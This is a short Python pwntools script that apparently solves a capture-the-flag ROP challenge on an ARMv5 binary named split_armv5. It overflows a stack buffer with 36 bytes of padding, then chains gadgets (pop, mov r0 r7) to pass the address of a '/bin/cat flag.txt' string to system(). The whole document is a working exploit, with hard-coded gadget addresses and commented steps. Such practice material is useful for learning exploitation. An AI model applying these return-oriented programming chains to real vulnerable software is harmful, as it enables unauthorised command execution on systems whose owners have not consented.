#!/usr/bin/env python3

from pwn import *

binary = ELF("./split_armv5")
context.binary = binary
rop = ROP(binary)

#context.log_level = "debug"

p = process(binary.path)
p.recvuntil(b">")

# addresses/data
OFFSET = 36
PADDING = p32(0)
BIN_CAT_FLAG_ADDR = p32(0x2103c)        # /bin/cat flag.txt address
SYSTEM_CALL_ADDR = p32(0x103ec)         # bl system()
POP_MANY = p32(0x10644)                 # pop {r4, r5, r6, r7, r8, sb, sl, pc}
MOV_R0_R7 = p32(0x10634)                # mov r0, r7
POP_R3_PC = p32(0x10658)                # pop {r3, pc}


# ROP chain construction
# 36 char garbage
rop.raw(b"A"*OFFSET)

# pc -> r3
rop.raw(POP_R3_PC)
# system() -> pc
# so we're putting the address of bl system to use later
rop.raw(SYSTEM_CALL_ADDR)

# place the /bin/cat flag.txt into r7 whilst putting
# nothing into everything else
rop.raw(POP_MANY)
rop.raw(PADDING)                        # r4
rop.raw(PADDING)                        # r5
rop.raw(PADDING)                        # r6
rop.raw(BIN_CAT_FLAG_ADDR)              # /bin/cat flag.txt address into r7
rop.raw(PADDING)                        # r8 
rop.raw(PADDING)                        # sb
rop.raw(PADDING)                        # sl

# r7 -> r0
# which will do system("/bin/cat flag.txt")
rop.raw(MOV_R0_R7)

p.sendline(rop.chain())
print(p.recvall().decode("utf-8").split("\n")[1])
